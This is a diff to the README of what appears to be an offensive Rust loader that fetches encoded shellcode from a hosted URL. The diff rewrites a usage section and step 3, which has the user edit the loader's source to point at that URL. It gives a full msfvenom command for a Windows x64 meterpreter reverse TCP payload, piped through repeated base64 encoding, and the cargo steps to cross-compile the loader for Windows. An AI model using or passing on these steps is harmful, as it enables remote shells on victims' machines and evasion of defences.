@@ -24,13 +24,13 @@ python3 encode.py [SHELLCODE_FILE] [B64_ITERATIONS] [OUT_FILE]
 
 ### Alternative usage
 
-If you don't want to use the script, you can also encode `0x` hex values from `msfvenom`. It would go something like this:
+If you don't want to use the script, you can also encode raw shellcode from `msfvenom`. It would go something like this:
 
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f csharp | tail -n+2 | sed 's/[{}; \n]//g' | base64 -w 0 > note.txt
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw | base64 -w 0 > note.txt
 # Pipe to base64 -w 0 as many times as you want to iterate the encoding
 ```
-3. Edit the source code in `src/main.rs` to reflect the URL where the encoded shellcode will be hosted.
+3. Edit the source code in `src/main.rs` to reflect the `URL` where the encoded shellcode will be hosted.
 
 4. Run `cargo build --target x86_64-pc-windows-gnu --release`. If building on Linux for Windows, make sure you've added the Windows target triple with `rustup target add x86_64-pc-windows-gnu`.
 
